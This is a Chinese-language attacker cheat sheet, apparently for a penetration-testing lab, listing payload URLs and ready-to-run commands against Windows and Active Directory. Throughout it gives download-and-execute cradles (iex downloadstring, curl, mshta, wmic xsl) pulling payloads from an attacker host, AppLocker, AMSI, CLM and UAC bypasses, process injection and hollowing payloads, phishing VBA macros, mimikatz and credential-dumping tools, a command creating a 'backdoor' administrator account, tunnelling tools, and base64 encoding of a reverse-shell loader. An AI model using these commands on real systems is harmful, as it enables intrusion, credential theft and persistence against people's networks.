# 使用手册
作者: seagate_yang@163.com

---
## 目录
- payloads
  - csharp
  - powershell
  - vba

- 白名单绕过


- 网页目录


---
## 可直接使用
> 注入explorer

__csharp exe__ http://10.10.15.160/out/exe/Inject.exe

__csharp dll__ http://10.10.15.160/out/dll/ClassLibrary1.dll


__powershell__ http://10.10.15.160/out/ps1/rev1.ps1



> Hollowing

__csharp exe__ http://10.10.15.160/out/exe/Hollow.exe

__csharp dll__ http://10.10.15.160/out/dll/ClassLibrary2.dll

<details>
<summary>思路</summary>

- 有高权限则migrate svchost
- rundll32 需要添加 
  - `[DllImport("MyLibrary.dll", EntryPoint = "MyMain")]`
  - `public static extern void MyMain(string arg1, string arg2);`
</details>


> 其他powershell脚本

__msfvenom__

http://10.10.15.160/out/ps1/met.ps1


__msfvenom thread__

http://10.10.15.160/out/ps1/met_thread.ps1


__powershell反射dll__

http://10.10.15.160/out/ps1/reflect1.ps1



__net反射dll__

http://10.10.15.160/out/ps1/reflectDLL.ps1


---
## DotNet2JScript
__Inject__
```
C:\tools\DotNetToJScript-master\DotNetToJScript\bin\Release\DotNetToJScript.exe \\192.168.26.132\visualstudio\project\out\dll\TestClass1.dll --lang=JScript ==ver=v4 -o \\192.168.26.132\visualstudio\project\out\js\script1.js 
```

__Hollowing__
```
C:\tools\DotNetToJScript-master\DotNetToJScript\bin\Release\DotNetToJScript.exe \\192.168.26.132\visualstudio\project\out\dll\TestClass2.dll --lang=JScript ==ver=v4 -o \\192.168.26.132\visualstudio\project\out\js\script2.js 
```

<details>
<summary>思路</summary>
- 客户端攻击 和HTML结合
- 白名单绕过
  - 放入hta中和mshta结合 - 8.5.1
  - 放入xsl和wmic - 8.5.2
</details>

---
## 绕过Applocker
__Compiler__

http://10.10.15.160/out/other/test.xml

http://10.10.15.160/out/other/test.txt
```
C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe test.xml test.txt
```

__installtuil__

调用powershell下载dll和ps1，net反射dll

http://10.10.15.160/out/exe/BypassCLM.exe 

调用powershell注入explorer

http://10.10.15.160/out/exe/BypassCLM_ps_inject.exe

```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U <路径>
```
<details>
<summary>思路</summary>
- 更改命令
- 切换不同的脚本
</details>


__hta__

http://10.10.15.160/out/other/bypassAppLocker.hta

```
C:\Windows\System32\mshta.exe http://10.10.15.160/out/other/bypassAppLocker.hta
```
<details>
<summary>其他思路</summary>

- 钓鱼
  - 邮件 参考challenge
  - 网址
  - 快捷方式 参考challenge 

</details>

__xsl__

http://10.10.15.160/out/other/data.xsl

```
wmic process get brief /format:"http://10.10.15.160/out/other/data.xsl
```


____

---
## 钓鱼

__vba__

直接注入explorer

http://10.10.15.160/out/other/inject.vba

wmi调用powershell 脚本默认为注入explorer的ps1

http://10.10.15.160/out/other/wmi.vba 


__aspx__

http://10.10.15.160/out/other/index.aspx




---
## 其他工具

> 域枚举

__ADCollector__

```
curl http://10.10.15.160/obf/ADCollector.exe -o C:\Users\Public\ADCollector.exe
```

__ADSearch__

```
curl http://10.10.15.160/obf/ADSearch.exe -o C:\Users\Public\ADSearch.exe
```

__SharpHound__

```
curl http://10.10.15.160/obf/SharpHound.exe -o C:\Users\Public\SharpHound.exe
```

__SharpView__

```
curl http://10.10.15.160/obf/SharpView.exe -o C:\Users\Public\SharpView.exe
```

__adPEAS.ps1__

```
iex ((new-object net.webclient).downloadstring('http://10.10.15.160/tools/ps1/adPEAS.ps1')) 

Invoke-adPEAS

Invoke-adPEAS -Domain EXAMPLE.com
```

__PowerView.ps1__

```
iex ((new-object net.webclient).downloadstring('http://10.10.15.160/tools/ps1/PowerView.ps1')) 
```


> 提权枚举

__Seatbelt__
```
curl http://10.10.15.160/obf/Seatbelt.exe -o C:\Users\Public\Seatbelt.exe
```

__SharpUp__

```
curl http://10.10.15.160/obf/SharpUp.exe -o C:\Users\Public\SharpUp.exe
```

__winPEAS__
```
curl http://10.10.15.160/obf/winPEAS.exe -o C:\Users\Public\winPEAS.exe
```

__HostRecon.ps1__

```
iex ((new-object net.webclient).downloadstring('http://10.10.15.160/tools/ps1/HostRecon.ps1'))
```

__LAPSToolkit.ps1__

```
iex ((new-object net.webclient).downloadstring('http://10.10.15.160/tools/ps1/LAPSToolkit.ps1')) 
```

__PowerUp.ps1__

```
iex ((new-object net.webclient).downloadstring('http://10.10.15.160/tools/ps1/PowerUp.ps1')) 
```

> 横向移动

__Rubeus__

```
curl http://10.10.15.160/obf/Rubeus.exe -o C:\Users\Public\Rubeus.exe

iex ((new-object net.webclient).downloadstring('http://10.10.15.160/tools/ps1/Invoke-Rubeus.ps1')) 
Invoke-Rubeus -Command "xxxxxx"
```

__SharpDump.exe__

```
curl http://10.10.15.160/obf/SharpDump.exe -o C:\Users\Public\SharpDump.exe
```

__PsExec64.exe__

```
curl http://10.10.15.160/tools/PsExec64.exe -o C:\Users\Public\PsExec64.exe
```

__mimikatz.exe__

```
curl http://10.10.15.160/tools/mimikatz.exe -o C:\Users\Public\mimikatz.exe
```

__PrintSpoofer.exe__

```
curl http://10.10.15.160/tools/PrintSpoofer.exe -o C:\Users\Public\PrintSpoofer.exe
```

__SpoolSample.exe__

```
curl http://10.10.15.160/tools/SpoolSample.exe -o C:\Users\Public\SpoolSample.exe
```

__Invoke-Mimikatz.ps1__

```
iex ((new-object net.webclient).downloadstring('http://10.10.15.160/tools/ps1/Invoke-Mimikatz.ps1')) 
```

__lat__

```
curl http://10.10.15.160/tools/lat.exe -o C:\Users\Public\lat.exe
```

__SharpRDP.exe__

```
curl http://10.10.15.160/obf/SharpRDP.exe -o C:\Users\Public\SharpRDP.exe
```

> 绕过

__AMSI__
```
iex ((new-object net.webclient).downloadstring('http://10.10.15.160/tools/ps1/amsibypass.ps1')) 
```

__SharpAppLocker.exe__
```
curl http://10.10.15.160/obf/SharpAppLocker.exe -o C:\Users\Public\SharpAppLocker.exe
```

__SharpBypassUAC.exe__
``` cmd
curl http://10.10.15.160/obf/SharpBypassUAC.exe -o C:\Users\Public\SharpBypassUAC.exe
```

__PsBypassCLM.exe__
``` cmd
curl http://10.10.15.160/tools/PsBypassCLM.exe -o C:\Users\Public\PsBypassCLM.exe

C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\Users\Public\PsBypassCLM.exe
```

__Installutil绕过__

``` cmd
# 1 下载dll和net反射dll的ps1脚本 反射得到shell
curl http://10.10.15.160/out/exe/BypassCLM.exe -o C:\Users\Public\BypassCLM.exe

# 2 下载并执行inject的ps1脚本
curl http://10.10.15.160/out/exe/BypassCLM_ps_inject.exe -o C:\Users\Public\BypassCLM.exe

C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\Users\Public\BypassCLM.exe
```

__Complier__

``` cmd
curl http://10.10.15.160/out/other/test.xml -o C:\Users\Public\test.xml 
curl http://10.10.15.160/out/other/test.txt -o C:\Users\Public\test.txt

C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe C:\Users\Public\test.txt C:\Users\Public\test.xml
```

__hta + certutil + bitsadmin__

http://10.10.15.160/out/other/bypassAppLocker.hta

制作快捷方式 或 html走私
``` cmd
C:\Windows\System32\mshta.exe http://10.10.15.160/out/other/bypassAppLocker.hta
```

__wmic xsl__
``` cmd
wmic process get brief /format:"http://10.10.15.160/out/other/data.xsl"
```

> uac

```
# Invoke-BypassUAC
iex ((new-object net.webclient).downloadstring('http://10.10.15.160/tools/ps1/Invoke-BypassUAC.ps1')) 

Invoke-BypassUAC -Command 'net user backdoor "Password123!" /add && net localgroup administrators backdoor /add"' -Verbose
Invoke-BypassUAC -PayloadPath .\payload.dll -Verbose

# Invoke-FodHelperBypass.ps1
iex ((new-object net.webclient).downloadstring('http://10.10.15.160/tools/ps1/Invoke-FodHelperBypass.ps1')) 
# 执行base64加密的命令
Invoke-FodHelperBypass -Command "IgBJAHMAIABFAGwAZQB2AG "

```

> 隧道

__chisel__

curl http://10.10.15.160/tools/chisel.exe -o C:\Users\Public\chisel.exe
curl http://10.10.15.160/obf/SharpChisel.exe -o C:\Users\Public\SharpChisel.exe


__frp__

curl http://10.10.15.160/tools/frp_win/frps.exe -o C:\Users\Public\frps.exe

curl http://10.10.15.160/tools/frp_win/frpc.exe -o C:\Users\Public\frpc.exe

wget http://10.10.15.160/tools/frp_lin/frps

wget http://10.10.15.160/tools/frp_lin/frpc


> mssql

**SqlClient.exe**

curl http://10.10.15.160/obf/SqlClient.exe -o C:\Users\Public\SqlClient.exe
 
**AutoSQL.exe**

curl http://10.10.15.160/tools/AutoSQL.exe -o C:\Users\Public\AutoSQL.exe

**PowerUpSQL.ps1**

``` powershell
((new-object net.webclient).downloadstring('http://10.10.15.160/tools/ps1/PowerUpSQL.ps1')) | iex
```

> 其他

配合RBCD 添加计算机账户 powermad / StandIN

```
iex ((new-object net.webclient).downloadstring('http://10.10.15.160/tools/ps1/powermad.ps1')) 
```




---
## 加密

``` powershell
$text = "(New-Object System.Net.WebClient).DownloadString('http://10.10.15.160/out/ps1/rev1.txt') | IEX"

$bytes = [System.Text.Encoding]::Unicode.GetBytes($text)

$EncodedText = [Convert]::ToBase64String($bytes)

$EncodedText | clip
```


---
## 参考
[混淆的程序](https://github.com/Flangvik/ObfuscatedSharpCollection/tree/main)

[混淆powershell脚本]()

[混淆hta]()